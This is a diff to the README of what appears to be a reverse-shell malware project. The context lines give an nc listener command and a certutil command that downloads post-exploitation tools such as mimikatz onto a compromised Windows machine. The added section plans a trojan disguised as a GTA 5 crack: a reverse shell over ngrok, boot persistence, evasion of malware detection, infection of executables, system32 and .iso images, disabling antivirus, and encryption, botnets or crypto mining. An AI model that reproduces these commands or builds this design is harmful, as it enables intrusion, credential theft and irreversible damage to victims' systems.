@@ -41,8 +41,19 @@ In the terminal, type `nc -lvp <PORT>`, replacing `<PORT>` with the port you hav
 
 After gaining access to your target, you can use `certutil` (`certutil -urlcache -split -f https://www.example.com/example.zip C:\path\to\file`, it being located in the system32 folder) or the embedded `--wget` function of the rs.py to download post-exploitation tools like priviledge exploitation with `mimikatz.exe`.
 
-# Future plans:
-- Once ran, automatically add to boot menu
-- Every 1 minute try to connect to server machine, if not connected
-- If process explorer, wireshark or other are detected, it enters in a hibernation stage for 1 hour, then it tries the connecting again
-- If ran with administrator perms, it will infect other .exe files
+# PLANS / WORKING ON / NOT ADDED YET :
+This "virus" will be organised in 3 stages.
+
+Once ran, it works like the app that it was advertised, for this example we will say that the app it was supposed to be is a crack for gta 5. The app starts normally and works normally, but the "malicious" code is first checking for its permissions, it starts by starting a reverse shell tunnel to the attacker (using embedded tunnel like ngrok).
+
+
+Stage 1. ```It starts by analyzing its permissions, and replacing good .exe files with infected ones. It adds itself to boot menu and slowly infects everything that it finds from its database. While keeping itself hidden from malware detection.```
+
+Stage 2. ```It adds itself to boot menu and chooses an app like Microsoft Edge to embed itself into it. It's now infecting every executable file in your system. Its goal now is to achieve administrator permissions and to infect the system32.```
+
+Stage 3. ```At this point, damage is irreversible. And antivirus can be shut down at any time, for the system to be encrypted, or used for other purposes that the attacker might like, for example, botnets or crypto mining. Topping to that, .iso files will be natively infected with the same virus, working on all types of images```
+
+Disclaimer that these are only future plans, stuff might change. For now its only a simple local hosted reverse shell. 
+
+
+
